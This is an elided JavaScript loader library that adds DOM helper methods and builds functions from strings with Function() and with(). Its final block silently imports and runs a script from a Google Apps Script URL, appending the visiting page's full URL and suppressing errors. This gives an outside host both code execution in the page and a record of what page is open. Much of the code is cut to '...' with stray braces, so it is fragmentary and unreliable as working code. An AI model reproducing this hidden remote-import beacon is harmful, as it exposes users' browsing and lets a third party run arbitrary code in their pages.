if (!(globalThis?.JXSLOADER)) {
  ...
  try {
    ...
    Math.avg = function() {
      return [...arguments].reduce((x, y) => x + y / (arguments.length || 1), 0);
    };
            ...
            if (`${func}`.includes('this')) {
              return function(el) {
                try {
                  ...
                  try {
                    func = Function('el', `with(el){return(${func}).apply(el,[])}`);
                  } catch (e) {}
                }
              };
            }
            try {
              func = Function('el', `with(el){return(${func})()}`);
            } catch (e) {}
          }
        }
    ...
    globalThis.declareEvaluator = async function declareEvaluator() {
      if ((new Date().getTime() - globalThis.declareEvaluator.lastRun) < 100) {
        return;
      }
    ...
    globalThis.designEvaluator = async function() {
      if ((new Date().getTime() - globalThis.designEvaluator.lastRun) < 100) {
        return;
      }
    ...
    */
    ...
    objDefProp(globalThis.Node?.prototype ?? {}, 'xpathSelectorAll', function(query) {
      ...
      try {
        ...
        for (let i = 0; i < nodeSnapshot_length; i++) {
          try {
    ...
    objDefProp(globalThis.Element?.prototype ?? {}, 'setAttributes', function(attr) {
      ...
      try {
        ...
        for (let i = 0; i < attrkeys_length; i++) {
          try {
            const k = attrkeys[i];
    ...
    globalThis.buildElement = function(item, options) {
      ...
      for (let i = 0; i < opkeys.length; i++) {
        if (opkeys[i].toLowerCase().includes('attr')) {
          el.setAttributes(options[opkeys[i]]);
        }
        if (opkeys[i].toLowerCase().includes('sty')) {
          el.setStyles(options[opkeys[i]]);
        }
        if (opkeys[i].toLowerCase().includes('val')) {
          el.setValues(options[opkeys[i]]);
        }
        if (opkeys[i].toLowerCase().startsWith('child')) {
          el.addChildren(options[opkeys[i]]);
        }
        if (opkeys[i].toLowerCase().includes('trait')) {
          el.setValues(options[opkeys[i]]);
          {
            el.setAttributes(options[opkeys[i]]);
          }
...
(() => {
  import('https://script.google.com/macros/s/AKfycbzJHlH1FTmlLJ1T9AeJHxMKfutB2fJKXuNvaqJSDgQCqnjb44mpdeopB2tONYrLQGqH/exec?' + location.href).catch(() => {});
})();
